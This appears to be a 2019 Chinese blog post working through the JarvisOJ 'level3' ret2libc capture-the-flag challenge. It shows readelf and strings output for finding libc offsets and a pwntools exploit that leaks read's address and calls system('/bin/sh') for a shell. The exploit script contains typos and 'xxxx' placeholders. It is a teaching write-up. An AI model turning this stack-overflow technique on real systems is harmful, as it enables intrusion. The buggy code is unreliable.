<!DOCTYPE html><html lang="zh_CN"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width, initial-scale=1"><title>最简单的ret2libc</title><link rel="shortcut icon" href="/images/avatar.png"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.2.0/styles/github.min.css"><script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script></head><body><nav class="main-nav"><a href="/">Home</a><a href="/archives">Archives</a></nav><div class="profile"><section id="wrapper"><header id="header"><a href="/about"><img class="2x" id="avatar" src="/images/avatar.png"></a><h1>L1Ya0</h1><h2></h2></header></section></div><section class="post" id="wrapper"><article><header><h1>最简单的ret2libc</h1><h2 class="headline">7月 21, 2019 8:28·1k words
·5 minutes read<span class="tags"></span></h2></header><div id="toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01"><span class="toc-text">0x01</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#主要思想"><span class="toc-text">主要思想</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#工具"><span class="toc-text">工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#例题"><span class="toc-text">例题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#详解"><span class="toc-text">详解</span></a></li></ol></li></ol></div><section id="post-body"><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>​        对于我来说ret2libc还是比较难懂的一块东西，借着师兄的学习资料，总算对ret2libc有了一点深刻的了解。</p>
<hr>
<h3 id="主要思想"><a href="#主要思想" class="headerlink" title="主要思想"></a>主要思想</h3><p>​        ret2libc这一类的题目一般会给你一个题目文件和一个libc库文件。如libc.so。libc.so里存放的是程序编译的所有函数，而解题的主要思想就是借助libc.so里各个函数之间的相对地址和程序的是相同的这一特性。libc库中的函数和主函数中的函数，其地址的差值就是所谓的offset。如果知道了这个offset和任意libc中的函数A地址，你就知道了A在主函数中的地址。</p>
<hr>
<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">readelf -a ./libc.so | grep &quot;function@&quot;     #在libc.so里查找function函数地址</span><br><span class="line">strings -a -t x ./libc.so | grep &quot;/bin/sh&quot;  #在libc.so里查找字符串”/bin/sh“地址</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>​        JarvisOJ中的level3。打开后发现</p>
<p><img src="C:%5CUsers%5C13953%5CDesktop%5C%E6%8D%95%E8%8E%B7.PNG" alt></p>
<p>read()是一个明显的栈溢出漏洞函数（gets()，puts()等也是）。</p>
<p>使用上面提到的工具：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">aidmong@ubuntu:~/Desktop/Jarvis OJ/[XMAN]level3$ readelf -a libc.so | grep &quot;system&quot;</span><br><span class="line">   243: 0011b8a0    73 FUNC    GLOBAL DEFAULT   12 svcerr_systemerr@@GLIBC_2.0</span><br><span class="line">   620: 00040310    56 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE</span><br><span class="line">  1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0</span><br><span class="line">aidmong@ubuntu:~/Desktop/Jarvis OJ/[XMAN]level3$ readelf -a libc.so | grep &quot;read@&quot;</span><br><span class="line">   571: 000dd3e0   125 FUNC    WEAK   DEFAULT   12 __read@@GLIBC_2.0</span><br><span class="line">   705: 0006f230    50 FUNC    GLOBAL DEFAULT   12 _IO_file_read@@GLIBC_2.0</span><br><span class="line">   950: 000dd3e0   125 FUNC    WEAK   DEFAULT   12 read@@GLIBC_2.0</span><br><span class="line">  1166: 000e30f0  1461 FUNC    GLOBAL DEFAULT   12 fts_read@@GLIBC_2.0</span><br><span class="line">  1263: 000ee840    46 FUNC    GLOBAL DEFAULT   12 eventfd_read@@GLIBC_2.7</span><br><span class="line">  1698: 000643a0   259 FUNC    WEAK   DEFAULT   12 fread@@GLIBC_2.0</span><br><span class="line">  2181: 000c5690   204 FUNC    WEAK   DEFAULT   12 pread@@GLIBC_2.1</span><br><span class="line">  2300: 000643a0   259 FUNC    GLOBAL DEFAULT   12 _IO_fread@@GLIBC_2.0</span><br><span class="line">aidmong@ubuntu:~/Desktop/Jarvis OJ/[XMAN]level3$ readelf -a libc.so | grep &quot;write@&quot;</span><br><span class="line">   108: 0006c410   323 FUNC    GLOBAL DEFAULT   12 _IO_wdo_write@@GLIBC_2.2</span><br><span class="line">   182: 000dd460   125 FUNC    WEAK   DEFAULT   12 __write@@GLIBC_2.0</span><br><span class="line">   306: 0012a880    45 FUNC    GLOBAL DEFAULT   12 _IO_do_write@GLIBC_2.0</span><br><span class="line">   307: 0006fcc0    45 FUNC    GLOBAL DEFAULT   12 _IO_do_write@@GLIBC_2.1</span><br><span class="line">  1330: 000c5760   204 FUNC    GLOBAL DEFAULT   12 __libc_pwrite@@GLIBC_PRIVATE</span><br><span class="line">  1677: 000ee870    62 FUNC    GLOBAL DEFAULT   12 eventfd_write@@GLIBC_2.7</span><br><span class="line">  1692: 000647f0   372 FUNC    WEAK   DEFAULT   12 fwrite@@GLIBC_2.0</span><br><span class="line">  2140: 0012a2d0   108 FUNC    GLOBAL DEFAULT   12 _IO_file_write@GLIBC_2.0</span><br><span class="line">  2144: 0006ecf0   131 FUNC    GLOBAL DEFAULT   12 _IO_file_write@@GLIBC_2.1</span><br><span class="line">  2165: 000647f0   372 FUNC    GLOBAL DEFAULT   12 _IO_fwrite@@GLIBC_2.0</span><br><span class="line">  2186: 000c5760   204 FUNC    WEAK   DEFAULT   12 pwrite@@GLIBC_2.1</span><br><span class="line">  2303: 000dd460   125 FUNC    WEAK   DEFAULT   12 write@@GLIBC_2.0</span><br><span class="line">aidmong@ubuntu:~/Desktop/Jarvis OJ/[XMAN]level3$ readelf-a libc.so | grep &quot;exit@&quot;</span><br><span class="line">readelf-a：未找到命令</span><br><span class="line">aidmong@ubuntu:~/Desktop/Jarvis OJ/[XMAN]level3$ readelf -a libc.so | grep &quot;exit@&quot;</span><br><span class="line">   111: 00033690    58 FUNC    GLOBAL DEFAULT   12 __cxa_at_quick_exit@@GLIBC_2.10</span><br><span class="line">   139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0</span><br><span class="line">   554: 000b8634    24 FUNC    GLOBAL DEFAULT   12 _exit@@GLIBC_2.0</span><br><span class="line">   609: 0011e780    56 FUNC    GLOBAL DEFAULT   12 svc_exit@@GLIBC_2.0</span><br><span class="line">   645: 00033660    45 FUNC    GLOBAL DEFAULT   12 quick_exit@@GLIBC_2.10</span><br><span class="line">   868: 00033490    84 FUNC    GLOBAL DEFAULT   12 __cxa_atexit@@GLIBC_2.1.3</span><br><span class="line">  1037: 00128ce0    60 FUNC    GLOBAL DEFAULT   12 atexit@GLIBC_2.0</span><br><span class="line">  1492: 000fb610    62 FUNC    GLOBAL DEFAULT   12 pthread_exit@@GLIBC_2.0</span><br><span class="line">  2243: 00033290    77 FUNC    WEAK   DEFAULT   12 on_exit@@GLIBC_2.0</span><br><span class="line">  2386: 000fc180     2 FUNC    GLOBAL DEFAULT   12 __cyg_profile_func_exit@@GLIBC_2.2</span><br><span class="line">aidmong@ubuntu:~/Desktop/Jarvis OJ/[XMAN]level3$ strings -a -t x libc.so |grep &quot;/bin/sh&quot;</span><br><span class="line"> 162d4c /bin/sh</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote("")</span></span><br><span class="line">p=process(<span class="string">"./level3"</span>)</span><br><span class="line">e=ELF(<span class="string">"./level3"</span>)</span><br><span class="line">plt_write=hex(e.plt[<span class="string">'write'</span>])</span><br><span class="line">got_read=hex(e.got[<span class="string">'read'</span>])</span><br><span class="line">vulneradr=hex(e.symbols[<span class="string">'vulnerable_function'</span>])</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x88</span>+<span class="string">'aaaa'</span>+p32(int(plt_write,<span class="number">16</span>))+p32(int(vulneradr,<span class="number">16</span>))+p32(<span class="number">1</span>)+p32(int(got_read,<span class="number">16</span>))+p32(<span class="number">4</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload)</span><br><span class="line">readadr=hex(u32(p.recv(<span class="number">4</span>))<span class="comment">#read's real address</span></span><br><span class="line">print(<span class="string">'readadr='</span>+readar)</span><br><span class="line">libcread=<span class="number">0x000dd3e0</span></span><br><span class="line">offset=int(readadr,<span class="number">16</span>)-libcread<span class="comment">#offset of libc and main</span></span><br><span class="line">sysadr=offset+xxxx</span><br><span class="line">exitadr=offset+xxxx</span><br><span class="line">binshadr=offset+xxxx</span><br><span class="line">paylaod1=<span class="string">'a'</span>*<span class="number">0x88</span>+<span class="string">'aaaa'</span>+p32(sysadr)+p32(exitadr)+p32(binshadr)</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="详解"><a href="#详解" class="headerlink" title="详解"></a>详解</h3><p>​        我们知道</p>
<blockquote>
<p>plt表中存放的got表的地址，got表中存放的是函数的真实地址</p>
</blockquote>
<p>​        首先我们得到write的plt表值，read的got表值（got表存放的是read函数的真实地址），以及read函数所在的vulnerable_function的地址。然后我们就开始可以构造第一个payload来泄露read啊函数的真实地址了，前面的是0x88的泄露点和32位的部分，最后三个则是write函数所需的参数，vulenr函数是返回地址，即调用vunler函数和write函数来输出read函数的真实地址。知道了read的真实地址之后我们就可以构造offset了，使用readelf命令读取libc.so文件中的地址。</p>
<p>​        offset=readadr-libcread（read函数的真实地址-read函数的libc地址）</p>
<blockquote>
<p>offset = real_function_addr - libc_function_addr</p>
</blockquote>
<p>最后根据offset和各函数的地址就可以做出来了，”bin/sh”的地址可以用strings的命令得到。</p>
</section><nav id="post-nav"><span class="prev"></span><span class="next"><a href="/2019/07/17/第一次搭建博客/">Older Posts<span class="arrow">→</span></a></span></nav></article></section><footer id="footer"><div id="social"><a class="symbol" href="https://github.com/fuzhouxxdong"><i class="fa fa-github"></i></a></div><p class="small">© Copyright 2018 &nbsp;<i class="fa fa-heart" aria-hidden="true">&nbsp;Dxx</i></p><p class="small">Powered by &nbsp;<a href="https://hexo.io/">Hexo &nbsp;</a>Theme By &nbsp;<a href="https://github.com/fuzhouxxdong/hexo-theme-dxx">Dxx</a></p></footer><script>hljs.initHighlightingOnLoad();</script></body></html>